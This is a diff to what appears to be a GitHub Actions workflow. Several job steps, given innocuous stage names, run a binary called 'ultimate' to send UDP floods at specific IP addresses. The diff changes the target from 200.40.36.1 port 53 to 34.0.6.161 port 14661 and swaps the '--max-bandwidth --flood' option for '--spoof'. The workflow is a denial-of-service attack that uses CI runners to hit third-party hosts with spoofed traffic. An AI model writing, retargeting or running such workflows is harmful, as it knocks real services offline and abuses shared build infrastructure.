@@ -10,7 +10,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x ultimate
-      - run: ./ultimate udp 200.40.36.1 53 10 5000 --max-bandwidth --flood
+      - run: ./ultimate udp 34.0.6.161 14661 10 1500 --spoof
 
   stage-1-main:
     needs: stage-0-init
@@ -21,7 +21,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x ultimate
-      - run: ./ultimate udp 200.40.36.1 53 120 5000 --max-bandwidth --flood
+      - run: ./ultimate udp 34.0.6.161 14661 120 1500 --spoof
 
   stage-2-calc:
     runs-on: ubuntu-latest
@@ -45,7 +45,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x ultimate
-      - run: ./ultimate udp 200.40.36.1 53 10 5000 --max-bandwidth --flood
+      - run: ./ultimate udp 34.0.6.161 14661 10 1500 --spoof
 
   stage-3-cleanup:
     needs: [stage-1-main, stage-2-sequential]
